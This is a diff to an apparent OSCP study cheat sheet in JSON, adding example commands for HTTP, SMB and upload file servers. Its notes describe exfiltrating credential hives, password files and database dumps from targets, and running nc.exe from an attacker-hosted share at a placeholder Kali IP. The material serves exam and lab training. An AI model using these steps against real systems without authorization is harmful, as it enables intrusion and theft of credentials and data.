@@ -58,7 +58,8 @@
         "ft-powershell-iwr"
       ],
       "notes": "OSCP METHODOLOGY: This is your go-to file server for 95% of transfers. Run from directory containing your tools (cd ~/tools). Serves ALL files in current directory recursively - be careful not to expose sensitive data.\n\nMANUAL ALTERNATIVE: You could manually configure Apache/Nginx, but that's overkill for OSCP. This one-liner is faster.\n\nEXAM TIP: Start this immediately after getting VPN connection. Use a high port (8000-9000) to avoid permission issues. Keep the terminal visible to monitor download requests - confirms target connectivity.\n\nTIME ESTIMATE: 5 seconds to start server, instant downloads for tools under 50MB.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "python3 -m http.server 8000"
     },
     {
       "id": "ft-smb-server",
@@ -123,7 +124,8 @@
         "ft-smb-upload"
       ],
       "notes": "OSCP METHODOLOGY: Use for Windows targets when HTTP is blocked or for faster transfers (10-50x faster for large files). Port 445 often allowed on internal networks even when egress HTTP is blocked.\n\nMANUAL ALTERNATIVE: Configure Samba manually in /etc/samba/smb.conf, but Impacket is much faster for quick transfers.\n\nEXAM TIP: If target is Windows 10+ and connection fails, immediately try with authentication flags. After initial setup, files can be executed directly from share without downloading: \\\\<KALI_IP>\\share\\nc.exe\n\nREALITY CHECK: Some modern Windows builds require SMB signing which this doesn't support - fall back to HTTP if authentication still fails.\n\nTIME ESTIMATE: 5 seconds to start server. File transfers 10-100MB/sec on local network (much faster than HTTP).",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "impacket-smbserver share . -smb2support"
     },
     {
       "id": "ft-uploadserver",
@@ -182,7 +184,8 @@
         "ft-curl-upload"
       ],
       "notes": "OSCP METHODOLOGY: Essential for data exfiltration - getting loot OFF the target back to Kali. Accepts uploads at /upload endpoint via POST requests. Simpler than configuring PHP upload scripts.\n\nMANUAL ALTERNATIVE: Write custom PHP/Python upload handler, but uploadserver is purpose-built and faster.\n\nINSTALLATION: pip3 install uploadserver (may need to install once on exam Kali VM).\n\nEXAM TIP: Start this when you need to exfiltrate proof.txt, database dumps, or any files from target. Files save to current directory by default - cd to organized folder first. Monitor terminal to see upload progress.\n\nCOMMON UPLOADS: proof.txt, local.txt, SAM/SYSTEM hives, password files, database dumps.\n\nTIME ESTIMATE: 5 seconds to start server, upload speed depends on file size and network (typically 1-10MB/sec).",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "python3 -m uploadserver 80"
     }
   ]
 }
